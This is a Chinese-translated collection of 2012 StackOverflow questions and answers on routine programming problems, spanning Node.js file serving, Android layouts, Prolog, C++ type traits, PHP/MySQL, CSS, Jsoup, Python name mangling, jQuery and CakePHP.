# StackOverflow 问答 11927000-11927999

# node.js - 使用 node.js 从文件系统提供文件，响应正文返回为空

> ID：11927014
> 
> 赞同：0
> 
> 时间：2012-08-13T00:41:51.860
> 
> 标签：node.js, static-files

所以我试图在文件上传到服务器后将文件返回给用户。我将上传的文件存储在应用程序目录中，名为 uploads 的目录中。这是我用来提供文件的代码：

```
if (req.url.split("/")[1] == "uploads") {
    console.log("requesting file " + virtualToPhysical(req.url));
    var file = fs.readFile(virtualToPhysical(req.url), function (err, data) {
        if (err) {
            throw err;
        } else {
            res.writeHead(200, { 'Content-Type': mime.lookup(req.url) });
            res.end(data, 'binary');
        }
    });
} 
```

virtualToPhysical 只是将文件系统中目录的路径附加到请求 url 上。如果 req.url 是“/uploads/image1.jpg”，virtualToPhysical 将输出“/path/to/application/uploads/image1.jpg”。mime.lookup() 调用来自一个包含的库，该库为文件推断出正确的 MIME 类型。

此代码运行没有任何错误。响应标头看起来不错，但无论文件类型或大小如何，正文每次都返回为空。我尝试了另一种使用 util.pump() 的方法，但产生了相同的结果。

**编辑：* *我一直在环顾四周，这实际上是人们说用于通过节点提供文件的唯一方法。我不知道我的问题可能是什么。有人建议在调用 res.end() 时不要使用 'binary' 标志，但无论如何都会产生相同的效果。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T03:49:36.540

从您对;的调用中删除`'binary'`参数 `res.end()`该`encoding`参数仅在您发送字符串时适用，并且在这种情况下您正在发送缓冲区。此外，`'binary'`在最近版本的 node.js 中作为编码类型被删除。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T23:51:31.793

我发现问题不在于`fs.readFile`打开文件，而是我在上传时保存文件的方式。而不是`fs.writeFile()`在保存从强大的上传时使用，您需要从 /tmp 中的位置重命名它。这是一个例子：

```
form.parse(req, function (err, fields, files) {
  file_name = escape(files.upload.name);
  fs.rename(files.upload.path, virtualToPhysical("/uploads/" + file_name), function (err) {
    if (err) {
      throw err;
    } else {
      res.writeHead(200, {'Content-Type': 'text/html'});
      res.end(file_name);
    }
  });
}); 
```

# android - RadioGroup - 首次单击时未选择 RadioButton

> ID：11927015
> 
> 赞同：0
> 
> 时间：2012-08-13T00:41:57.377
> 
> 标签：android, android-widget

我在一个对话框视图中有两个单选按钮组，供我的用户选择他们想要的显示颜色。由于大小限制，我创建了两个组。因为这两个组在分开时不会保持互斥，所以我需要检查从 group1 到 group2 的更改并清除来自另一个组的选择。我通过向每个组添加一个 onCheckedChangeListener() 来做到这一点，如下所示：

```
 RadioGroup rGroup1 = (RadioGroup)currentDialog.findViewById(R.id.rgColors1);
     rGroup1.setOnCheckedChangeListener(new OnCheckedChangeListener(){
        @Override
        public void onCheckedChanged(RadioGroup group, int checkedId) {
            if(checkedId != -1)
            {
                RadioGroup rGroup2 = (RadioGroup) currentDialog.findViewById(R.id.rgColors2);
                rGroup2.clearCheck();
            }
        }

      });

     RadioGroup rGroup2 = (RadioGroup) currentDialog.findViewById(R.id.rgColors2);
     rGroup2.setOnCheckedChangeListener(new OnCheckedChangeListener(){

        @Override
        public void onCheckedChanged(RadioGroup group, int checkedId) {
            if(checkedId != -1)
            {
                RadioGroup rGroup1 = (RadioGroup) currentDialog.findViewById(R.id.rgColors1);
                rGroup1.clearCheck();
            }
        }

     }); 
```

我的对话框布局如下所示：

```
 <?xml version="1.0" encoding="utf-8"?>
 <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:id="@+id/colorDialogLinearLayout"
android:layout_width="fill_parent"
android:layout_height="fill_parent"
android:gravity="center"
android:minWidth="300dp"
android:orientation="vertical">
<TableLayout android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:id="@+id/tableLayout"
    android:padding="5dp">
    <TableRow android:gravity="center">
        <RadioGroup android:id="@+id/rgColors1">
            <RadioButton android:id="@+id/black_radio" 
                android:text="@string/option_black" 
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"/>
            <RadioButton android:id="@+id/blue_radio" 
                android:text="@string/option_blue" 
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"/>
            <RadioButton android:id="@+id/green_radio" 
                android:text="@string/option_green" 
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"/>
            <RadioButton android:id="@+id/orange_radio" 
                android:text="@string/option_orange" 
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"/>
            <RadioButton android:id="@+id/pink_radio"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:text="@string/option_pink" />
        </RadioGroup>
        <RadioGroup android:id="@+id/rgColors2">
            <RadioButton android:id="@+id/purple_radio" 
                android:text="@string/option_purple" 
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"/>
            <RadioButton android:id="@+id/red_radio" 
                android:text="@string/option_red" 
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"/>
            <RadioButton android:id="@+id/teal_radio" 
                android:text="@string/option_teal" 
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"/>
            <RadioButton android:id="@+id/yellow_radio" 
                android:text="@string/option_yellow" 
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"/>
        </RadioGroup>
    </TableRow>
</TableLayout>
<Button android:id="@+id/setBackColorButton"
  android:layout_width="wrap_content" 
  android:layout_height="wrap_content"  
  android:layout_gravity="center_horizontal"
  android:text="@string/button_set_back_color"/> 
```

当从任一组中选择单选按钮时，它不属于的组将被清除。我遇到的问题是选中的单选按钮未显示为选中状态，必须再次选择。我怀疑 clearCheck() 正在为两个无线电组运行，但我不确定为什么或如何防止这种行为。任何帮助将非常感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T21:37:19.837

最后，我必须为每个单选按钮创建一个 onclick() 事件。我认为我的第一种方法不起作用的原因是因为在将选择设置为无时触发了 onselectchange() 事件。在测试使用这种将第二组设置为无的方法的各种方法中，导致需要第二次执行选择或两组相互设置为无的无限循环。我相信在需要第二次执行选择的情况下是因为程序没有将控制权返回给调用程序来完成选择。我对 Android 有点陌生，所以我可以完全脱离基地。最后，单独的 onclick() 事件确实有效。

# http - HTTP 客户端可以使用分块编码将数据发送到 HTTP 服务器吗？

> ID：11927016
> 
> 赞同：0
> 
> 时间：2012-08-13T00:42:11.877
> 
> 标签：http, encoding, client, chunked

我遇到的一切都显示 HTTP 服务器使用分块编码发送响应，但是客户端是否可以在分块的 POST 请求中发送数据（即上传文件）？如果是这样，是否必须专门配置服务器来处理这种请求？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T08:01:26.160

是的，这是可能的，但不，并非所有服务器都支持它。

# android - 在 ListView 上对齐两个 TextView，一个左一个右，而不拉伸背景

> ID：11927024
> 
> 赞同：5
> 
> 时间：2012-08-13T00:43:10.037
> 
> 标签：android, android-layout, android-listview, alignment, textview

所以我`TextViews`每行有两个`ListView`. 一个应该左对齐，另一个右对齐。两者`TextViews`都有一个圆角矩形作为背景，应该只是将文本包裹在里面。所以我想出了这个：

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="wrap_content" >

    <TextView
        android:id="@+id/text_right"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_alignParentRight="true"
        android:background="@drawable/bubble_purple"
        android:gravity="center" >
    </TextView>

    <TextView
        android:id="@+id/text_left"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_alignParentLeft="true"
        android:layout_toLeftOf="@id/text_right"
        android:background="@drawable/bubble_blue"
        android:gravity="center" >
    </TextView>
</RelativeLayout> 
```

它看起来很适合长文本，但不适用于较短的消息：

![在此处输入图像描述](../Images/05a4a3fe4a3ffdee7784e3899b54dcdf.png)

我还尝试了这样的 LinearLayout：

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="wrap_content"
    android:orientation="horizontal" >

    <TextView
        android:id="@+id/text_left"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_weight="0"
        android:background="@drawable/bubble_blue"
        android:gravity="center" >
    </TextView>

    <View
        android:layout_width="0dp"
        android:layout_height="0dp"
        android:layout_weight="1" />

    <TextView
        android:id="@+id/text_right"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_weight="0"
        android:background="@drawable/bubble_purple"
        android:gravity="center">
    </TextView>
</LinearLayout> 
```

这适用于短消息，但不适用于较长的消息：

![在此处输入图像描述](../Images/1c26a5f055ba1f180606fce47ad49248.png)

是否有可能测量`TextViews`这些布局之间的组合宽度并以编程方式切换，或者我在这里做错了什么？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-13T00:49:58.073

这是否按您的意愿工作？

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="match_parent"
android:layout_height="wrap_content"
android:orientation="horizontal" >

<TextView
    android:id="@+id/text_right"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_weight="0.5"
    android:background="@drawable/bubble_blue"
    android:text="2"
    android:gravity="center" >
</TextView>

<TextView
    android:id="@+id/text_left"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_weight="0.5"
    android:background="@drawable/bubble_purple"
    android:text="9"
    android:gravity="center" >
</TextView>
</LinearLayout> 
```

通过添加 layout_weight 参数并使它们相等，您可以告诉布局引擎在两个视图之间平均分配任何空闲空间。如果你希望左边的块比右边的大，你可以给它更大的权重。

**编辑：**也许这更好：

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="match_parent"
android:layout_height="wrap_content"
android:orientation="horizontal" >

<LinearLayout 
    android:id="@+id/text_left"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_weight="0.5" >

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:background="#456"
        android:text="5 + 1"
        android:gravity="center" >
    </TextView> 

</LinearLayout>

<TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:gravity="center"
        android:text=" = " >
</TextView>

<LinearLayout 
    android:id="@+id/text_right"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layoutDirection="rtl"
    android:layout_weight="0.5">

        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:background="#856"
            android:text="6"
            android:gravity="center" >
        </TextView>

</LinearLayout>

</LinearLayout> 
```

# prolog - 在 Prolog 中计算立方体列表

> ID：11927028
> 
> 赞同：1
> 
> 时间：2012-08-13T00:43:59.970
> 
> 标签：prolog, clpfd

所以我在 SWI-Prolog 中做一些 Prolog，我遇到了一些障碍。给定一个输入列表，我必须创建一个多维数据集列表。我目前拥有的代码是

```
cubes([Head|Tail],Cubes) :-
    cubes([Head|Tail],Cubes,[]).
cubes([Head|Tail],Cubes,ActualCubes) :-
    X is Head^3,
    append(ActualCubes,[X],NewCubes),
    cubes(Tail,Cubes,NewCubes).
cubes([Tail],Cubes,ActualCubes) :-
    X is Tail^3,
    append(ActualCubes,[X],NewCubes),
    Cubes is NewCubes. 
```

当我运行它时，它会给出一个错误，特别是......

```
ERROR: '.'/2: Type error: `[]' expected, found `[8]' ("x" must hold one character)
   Exception: (7) cbList([1, 2], _G296, []) ? creep 
```

我不完全确定为什么会发生这个错误，但它似乎发生在最后一行，Cubes is NewCubes。任何帮助表示赞赏:)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-13T06:02:54.307

我认为您正在尝试使用一种称为*accumulator*的模式，使用包含中间结果的*附加参数*重写二进制关系。

除了语法错误，您应该注意累加器在这里没用，因为列表的每个元素*仅*与另一个列表的相应元素相关。

对于这种常见情况，library( [apply](http://www.swi-prolog.org/pldoc/doc_for?object=section%282,%27A.2%27,swi%28%27/doc/Manual/apply.html%27%29%29) ) 具有[maplist /3 ：](http://www.swi-prolog.org/pldoc/doc_for?object=maplist/3)

```
cube(N, C) :-
    C is N^3.
cubes(Ns, Cs) :-
    maplist(cube, Ns, Cs). 
```

并且 library( [clpfd](http://www.swi-prolog.org/pldoc/doc_for?object=section%282,%27A.7%27,swi%28%27/doc/Manual/clpfd.html%27%29%29) ) 具有有趣的功能，可以（在整数域中）更好地*处理*算术。将上面的立方体替换为

```
:- [library(clpfd)].

cube(N, C) :-
    N ^ 3 #= C. 
```

你可以写

```
?- cubes(X,[1,8,27]).
X = [1, 2, 3]. 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T01:45:35.167

首先，您`cubes`使用不同数量的参数制作不同的谓词。这必然会导致概念和句法问题，所以在这一点上，重新考虑你在做什么。在这种情况下，尝试扩展您可以使用模式匹配和递归的方式：

```
cubes([],[]).
cubes([H|T], [Y|Z]):-
        Y is H*H*H,
        cubes(T,Z).

betterCubes([],[]).
betterCubes([H|T], [Y|Z]):-
        ( 
          var(Y) , nonvar(H)    -> Y is H*H*H
        ; nonvar(Y) , var(H)    -> H is Y**(1.0/3.0) 
        ; nonvar(Y) , nonvar(H) -> H*H*H =:= Y
        ),
        betterCubes(T,Z). 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-08-14T19:34:02.067

In this case, one can also accomplish the desired goal with a *difference list*:

```
cubes( [] , [] ) .
cubes( [X|Xs] , [Y|Ys] ) :-
  Y is X*X*X ,
  cubes( Xs , Ys )
  . 
```

The output list is built as we traverse the source list, recursing down. The final goal `cubes([],[])` unifies the empty list `[]` with the tail of the output list, making it a correct list.

The other approach is to use an accumulator, which builds the output in reverse order, then reverses it:

```
cubes(Xs,Ys) :-
  cubes(Xs,[],T) ,
  reverse(T,Ys)
  .

cubes( [] , Ys, Ys ).
cubes( [X|Xs] , Ts , Ys ) :-
  T is X*X*X ,
  cubes( Xs , [T|Ts] , Ys )
  . 
```

Both are (our should be) properly tail recursive.

# c++ - sfinae 使用 decltype 检查静态成员

> ID：11927032
> 
> 赞同：11
> 
> 时间：2012-08-13T00:44:17.007
> 
> 标签：c++, c++11

我编写了以下代码来尝试检测类型是否具有静态成员变量。不幸的是，它总是返回该变量不存在。

有人能告诉我哪里出错了吗？我正在使用 g++ 4.7.1。

```
#include <iostream>
#include <utility>
#include <type_traits>

using namespace std;

template <class T>                                                  
class has_is_baz                                                          
{                                                                   
    template<class U, 
             typename std::enable_if<std::is_same<bool, decltype(U::is_baz)>::value>::type...>                    
        static std::true_type check(int);                           
    template <class>                                                
        static std::false_type check(...);                          
public:                                                             
    static constexpr bool value = decltype(check<T>(0))::value;     
};

struct foo { };

struct bar 
{ 
    static constexpr bool is_baz = true;
};

int main()
{
    cout << has_is_baz<foo>::value << '\n';
    cout << has_is_baz<bar>::value << '\n';
} 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-08-13T00:55:22.100

主要问题是：

```
std::is_same<bool, decltype(bar::is_baz)>::value == false 
```

然后你的 SFINAE 总是失败。我已经重写了这个`has_is_baz`特征，它现在可以工作了：

```
#include <iostream>
#include <utility>
#include <type_traits>

using namespace std;

template <class T>                                                  
class has_is_baz                                                          
{       
    template<class U, class = typename std::enable_if<!std::is_member_pointer<decltype(&U::is_baz)>::value>::type>
        static std::true_type check(int);
    template <class>
        static std::false_type check(...);
public:
    static constexpr bool value = decltype(check<T>(0))::value;
};

struct foo { };

struct bar 
{ 
    static constexpr bool is_baz = true;
};

struct not_static {
    bool is_baz;
};

int main()
{
    cout << has_is_baz<foo>::value << '\n';
    cout << has_is_baz<bar>::value << '\n';
    cout << has_is_baz<not_static>::value << '\n';
} 
```

**编辑**：我已经修复了类型特征。正如@litb 所指出的，它正在检测静态成员以及非静态成员。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-08-13T01:56:18.450

您的代码中的问题是一个`constexpr`对象是隐式`const`的，这意味着您对相同类型的测试应该是：

```
std::is_same<const bool, decltype(U::is_baz)>::value 
```

这在 §7.1.5 [dcl.constexpr]/9 的标准中有所规定

> 对象声明中使用的 constexpr 说明符将对象声明为 const。[...]

# java - 如何轻松插入对象化数据库

> ID：11927033
> 
> 赞同：0
> 
> 时间：2012-08-13T00:44:22.230
> 
> 标签：java, google-app-engine, google-cloud-datastore, objectify

我有一个带有 objectify 数据库的 GAE 服务器。

我正在寻找一种将多行插入我的数据库的方法。我试图做这样的主要工作：

```
public static void main(String[] args) {
Objectify ofy = ObjectifyService.begin();
ofy.put(new MyWhateverObject("1"));   
ofy.put(new MyWhateverObject("2"));   
ofy.put(new MyWhateverObject("3"));
} 
```

但我收到此错误：

```
Exception in thread "main" java.lang.NullPointerException: No API environment is registered for this thread. 
```

我该怎么做？？

重要提示：我不想使用 LocalServiceTestHelper 测试我的应用程序，我想真正将行插入到我的数据库中。

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T17:05:31.913

您不应该在`main`方法中运行此代码。

在单元测试的情况下（这似乎是我试图引用的所有其他帖子似乎都是关于的）你应该在使用`LocalServiceTestHelper`.

但是，您特别提到您对本地测试*不*感兴趣，因此您应该在 servlet 的上下文中执行您的代码（请参阅[Requests and Servlets](https://developers.google.com/appengine/docs/java/runtime#Requests_and_Servlets)或[Getting Started](https://developers.google.com/appengine/docs/java/gettingstarted/introduction)以获得一个很好的示例）。

# php - 如何获取数据库的内容而不是索引

> ID：11927049
> 
> 赞同：0
> 
> 时间：2012-08-13T00:47:02.837
> 
> 标签：php, mysql, database, indexing

我成功地将数据插入到我的 MySQL 数据库中，但我的问题是我得到的结果和我在数据库中的结果是索引而不是实际内容。我为我的 php 文件中的一个选项编写了以下代码。如何获取内容而不是索引？是 SQL 语句的问题还是 PHP 代码的问题？例如，如果用户从弹出菜单中选择第一个选项，那么我将得到 No 1 而不是`serviceType = "Database Type"`

```
Finding ServiceType Title   RootCause   RiskRating  Impact  Efforts Likelihood  
1   2   gg  AC  1   1   1   1    gg  gg  gg 1
7   1   kkkk    Cfm 1   1   2   1    kkkkk   kkkkk   kkkkkk 1
    1

<?php
    mysql_select_db("ers_1", $con);
    $result = mysql_query("SELECT ServiceType_ID, ServiceType_Name FROM servicetype_lookup  ");
    while($row = mysql_fetch_array($result)) {
        $id = $row['ServiceType_ID'];
        $value = $row['ServiceType_Name'];
        echo "<option value='$id'>$value</option>";
    }
?> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T00:50:21.270

请在 SQL 工具中检查您的查询，以确保您实际接收到该查询的数据。如果没有数据，那可能会导致您的问题。

另外，使用：

```
while($row = mysql_fetch_assoc($result)) 
```

代替

```
while($row = mysql_fetch_array($result)) 
```

在您的`while()`声明中获得您正在寻找的输出。

祝你好运！

正如一个想法，您需要考虑放弃`mysql_`命令以支持 MySQLi 和 PDO 库。

看这里：[选择 MySQL API](http://php.net/manual/en/mysqlinfo.api.choosing.php)

# css - Css：div的溢出和宽度

> ID：11927051
> 
> 赞同：-1
> 
> 时间：2012-08-13T00:47:43.320
> 
> 标签：css, html, overflow

假设我的全文如下所示：

`Hello, my name is David.`

我想要一个 div 把它变成：

`Hello, my name i`

这很简单，我只希望 div 的宽度为，例如`90px`. 所以其余的文本不会显示，也不会转到下一行。

```
.glass-text {
font-family:Tahoma, Geneva, sans-serif;
font-size:11px;
width:90px;
overflow:hidden;
height:15px;
} 
```

但上面的 css 不起作用，其余的文本转到下一行：

```
Hello, my name i
s David 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T00:54:43.190

也许您需要添加`display:inline-block`到您的 CSS 中。不知道为什么它会插入换行符。

我什至会将这两行添加到`.glass-text`：

```
text-overflow:ellipsis;
white-space:nowrap; 
```

**[演示](http://jsfiddle.net/RuQFP/)**

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T00:52:58.763

`Hello,&nbsp;my&nbsp;name&nbsp;is&nbsp;David.`在 html 或`white-space: nowrap;`css 中。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-13T00:57:59.633

同时使用 white-space: nowrap 和 overflow: hidden

# java - Jsoup 选择命令

> ID：11927053
> 
> 赞同：1
> 
> 时间：2012-08-13T00:47:46.160
> 
> 标签：java, html, css, jsoup

这是我第一次尝试使用 Jsoup。我无法理解“选择”操作。

```
 Elements media = doc.select("[src]"); 
```

这意味着在作为输入给出的页面中搜索 src 并选择该行。所以，我可以使用 src.tagname、src.width 和所有...

以下是什么意思？

```
 Elements links = doc.select("a[href]");
    Elements imports = doc.select("link[href]"); 
```

我有点困惑你能解释一下 a[href] 是什么意思以及如何使用它吗

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-03T23:37:04.010

```
Elements links = doc.select("a[href]"); 
```

--> 选择所有`a`带有属性的标签`href`

**例子：** `<a href="something">...</a>`

但正如 BalusC 之前所说：看看[有关选择器语法的文档](http://jsoup.org/cookbook/extracting-data/selector-syntax)

* * *

**“区域问题”：**

`doc.select("area[title]")`选择与此匹配的所有**元素，而不是属性！**

如果您需要所有名称（= 属性`title`），您可以使用：

```
Document doc = Jsoup.connect("http://en.wikipedia.org/wiki/States_and_territories_of_India").get();
Elements elements = doc.select("area[title]");

for( Element element : elements )
{
    String title = element.attr("title");

    // Do something with the title
    System.out.println(title);
} 
```

# python - 与超类同名的子类变量

> ID：11927055
> 
> 赞同：7
> 
> 时间：2012-08-13T00:48:06.487
> 
> 标签：python, subclass

是否有可能发生不覆盖？例如：

```
class A:
    def __init__(self, name):
        self.name = name

class B(A):
    def __init__(self, name):
        A.__init__(self, name)
        self.name = name + "yes" 
```

B 类有什么办法`self.name`可以独立于 A 类，还是必须使用不同的名称？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-08-13T00:58:49.500

使用两个下划线为名称添加前缀会导致名称混乱，这似乎是您想要的。例如

```
class A:
    def __init__(self, name):
        self.__name = name

    def print_name(self):
        print self.__name

class B(A):
    def __init__(self, name):
        A.__init__(self, name)
        self.__name = name + "yes"

    def print_name(self):
        print self.__name

    def print_super_name(self):
        print self._A__name #class name mangled into attribute 
```

在类定义中，您可以`__name`正常处理（如在`print_name`方法中）。在子类中，以及类定义之外的任何其他地方，类的名称与前面的下划线混合到属性名称中。

```
b = B('so')
b._A__name = 'something'
b._B__name = 'something else' 
```

在您发布的代码中，子类属性将覆盖超类的`name`，这通常是您想要的。如果您希望它们分开，但具有相同的变量名，请使用下划线

# http - 在“slug-url”中传递附加参数的正确方法是什么

> ID：11927056
> 
> 赞同：1
> 
> 时间：2012-08-13T00:48:18.527
> 
> 标签：http, web-applications

让我们假设一个有评论的博客，并且用户查看了一篇有很多评论的博客文章。博客文章的一个不错的 URL 可能如下所示：

```
http://www.example.com/blog/174/how_to_slug_urls 
```

174 是博客文章的数据库 ID。由于一页上显示的评论太多，评论被分成几页。

有没有一些常用的方法来传递评论页面参数？我是在 slug 之前附加它，在 slug 之后，通过 POST 发送它，还是有一些完整的其他方式？

我能想到的例子：

```
http://www.example.com/blog/174/how_to_slug_urls/commentpage/4
http://www.example.com/blog/174/how_to_slug_urls?commentpage=4
http://www.example.com/blog/174/how_to_slug_urls#commentpage=4   // maybe parsing with JS?
http://www.example.com/blog/commentpage/4/174/how_to_slug_urls 
```

**编辑：** 附加问题：如何处理未连接到当前数据的参数？例如 refreshIntervall=30s

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T01:38:03.517

在我看来，在这种情况下有两种可行的选择。

**选项 1：只使用查询字符串。**（即`http://www.example.com/blog/article/174/how_to_slug_urls?commentpage=4`）

请注意，我添加了`article/`. 这不是必需的，但我觉得以更易读的方式呈现 URI。

当您觉得评论是同一资源（博客文章）的一部分但仅出于分页目的需要单独的 URI 时，我建议使用查询字符串。

**选项 2：使用完全不同的 URI。**（即`http://www.example.com/blog/comments/174/how_to_slug_urls?page=4`）

请注意，我仍然使用查询字符串来区分页面。

视觉上不同的 URI 清楚地表明评论是一个单独的资源。这可能不是您查看评论的方式，但这是我查看评论的方式。

**相比：**

`http://www.example.com/blog/article/174/how_to_slug_urls?commentpage=4`

`http://www.example.com/blog/comments/174/how_to_slug_urls?page=4`

**处理其他参数：**只使用查询字符串。

我们似乎对不在`?`我们的 URI 中使用很着迷。有人会说它们不漂亮；我会反驳说，外表并不是一切。如果你真的想避免它，下面的 URI 是 . . . 可以接受，我猜：

`http://www.example.com/blog/article/174/how_to_slug_urls/4`

`http://www.example.com/blog/comments/174/how_to_slug_urls/4`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T01:24:07.770

如果评论页面是一个资源，即可以独立寻址的东西，显然它打算在这里，那么第一个 URL 就可以了。不过，我会将其设为“http://www.example.com/blog/174/how_to_slug_urls/commentpages/4”。注意's'。如“http://stackoverflow.com/questions/11927056”。

并且博客文章的评论显然从属于博客文章本身，因此与您的上一个示例相反，层次结构保留在该 url 中。

# jquery - 如何在Jquery中选择具有特定文本的所有文本框

> ID：11927059
> 
> 赞同：0
> 
> 时间：2012-08-13T00:48:47.073
> 
> 标签：jquery

如果我这样做：

```
$("[value='xxx']") 
```

它选择从网络服务器发送的带有`value=xxx`.

它不会选择`xxx`用户在客户端设置的文本框。

在下拉选择中，如果文本匹配，我想隐藏这些文本框。我该怎么做呢？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T00:50:40.397

```
$("input, textarea").filter(function(){
    return $(this).val() == 'XXX';  
}).hide(); 
```

使用该`.filter()`功能。

阅读更多：[http ://api.jquery.com/filter](http://api.jquery.com/filter)

JSfiddle： http: [//jsfiddle.net/pmuuM/](http://jsfiddle.net/pmuuM/)（尝试将值更改为XXX前后单击按钮）

或者（由于问题已更新）：

```
$('input, textarea').on('change', function(){
    if(this.value == 'XXX') $(this).hide();
}); 
```

# asp.net - 如何从asp.net的父页面设置驻留在用户控件中的组合框的选择值

> ID：11927060
> 
> 赞同：1
> 
> 时间：2012-08-13T00:48:52.430
> 
> 标签：asp.net, user-controls, webforms

我有一个包含用户控件的父页面。用户控件有几个组合框和文本框。在用户控件的 page_load 事件期间填充组合框。我想从父页面设置这些控件的值。在用户控件中，我有一个公共方法，我将数据传递给该方法并设置值，如下所示。它适用于文本框。但组合框不显示所选值。我认为这是因为页面生命周期和组合框的选定值是在用户控件的 page_load 事件之后设置的。请让我知道显示组合框选定值的最佳方式。

以下是我从父页面调用并传递数据的UC中的公共方法。

```
public void PopulateControlsForEdit(MemberMaintenanceData memberData, EmployeeType type) 
```

{

```
 FirstNameTextBox.Text = memberData.FirstName;
      cboState.SelectedIndex = cboState.Items.IndexOf(cboState.Items.FindByValue(memberData.State)); 
```

}

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T01:22:50.633

试试这个来设置选定的项目：

```
cboState.SelectedItem.Selected = false;
cboState.Items.FindByValue(memberData.State).Selected = true; 
```

# zk - 如何在 ZK 中将网格拟合到边框布局的中心

> ID：11927062
> 
> 赞同：0
> 
> 时间：2012-08-13T00:49:15.677
> 
> 标签：zk

我什么都试过了。我想要的只是让我的 ZK 网格适合边框布局中心的可用空间。如果网格中有额外的信息，我希望网格滚动，而不是边框​​布局的中心。如果我为网格输入 width="100%" 和 height="100%"，则宽度显示正确，但高度远低于页面底部（看不见）。我认为borderlayout应该将中心的高度调整为页面的高度减去北减去南？有人有任何线索吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T11:32:31.857

From my experience its better to use `hflex` and `vflex` attributes with values set to "1" (or "true") to fit components to the space of parent components. And you can try to use it in combination with grid's `style="overflow: auto"`. Read [this](http://books.zkoss.org/wiki/ZK%20Developer%27s%20Reference/UI%20Patterns/Hflex%20and%20Vflex) ZK doc section for further info.

# database - cakephp 提交数组到数据库

> ID：11927065
> 
> 赞同：1
> 
> 时间：2012-08-13T00:49:53.890
> 
> 标签：database, cakephp

大家好，我正在尝试使用带有连接关联的 hasMany 向数据库添加信息

```
Invoice - id, sender_id, receiver_id, template_id
Field - id, name, description, default_value, template_id
fields_invoices - id, invoice_id, field_id, entered_value 
```

这是视图

```
<?php echo $this->Form->create('FieldsInvoice'); ?>
<?php foreach ($fields as $field): ?>
<?php echo $this->Form->hidden($invoice_id); ?>
<?php echo $this->Form->hidden($field['Field']['id']); ?>
<?php echo $this->Form->Input($field['Field']['name'], array('default' =>$field['Field']['default_value'])); ?>
<?php endforeach ;?>
<?php echo $this->Form->End('Submit');?> 
```

这是控制器

```
public function create($id)
    {   
    $this->set('title_for_layout', 'Create Invoice');
    $this->set('stylesheet_used', 'homestyle');
    $this->set('image_used', 'eBOXLogoHome.png');   
    $this->layout='home_layout';

     if (!is_numeric($id)) throw new BadMethodCallException('I need an ID');
     $this->Invoice->id = $id;
     if (!$this->Invoice->exists()) throw new NotFoundException('Invalid ID');

    $this->set('invoice_id',$id);

    $names = $this->Invoice->find('list',array(
    'fields'=>array('template_id'),
    'conditions'=>array('id'=>$id)));

    $fields = $this->Field->find('all', array(
     'conditions'=>array(
     'template_id'=>$names)));

    $this->set(compact('fields'));
    $this->set(compact('invoice_id'));

    $this->set('name',$names);
    $this->Invoice->create();
    if(empty($this->data)){
        $this->data= $this->Field->read($id);
    } 
    else{
        if($this->request->is('post'))
        {
            die(debug($this->data));

            $this->Invoice->create();
            if($this->FieldsInvoice->save($this->request->data, array('deep'=>true)));
            {
            $this->Session->setFlash('The field has been updated');
            $this->redirect(array('controller'=>'invoices', 'action'=>'index'));

            }
            //else{
            $this->Session->setFlash('Could not be saved');
            //}
        }
    }
} 
```

这是使用调试时打印的内容

```
\app\Controller\InvoicesController.php (line 134)
array(
    'FieldsInvoice' => array(
        (int) 87 => '',
        (int) 0 => '',
        'invoiceno' => 'test1',
        (int) 99 => '',
        'duedate' => 'test2',
        (int) 999 => '',
        'amount' => 'test3',
        (int) 9999 => '',
        'description' => 'test4'
    )
) 
```

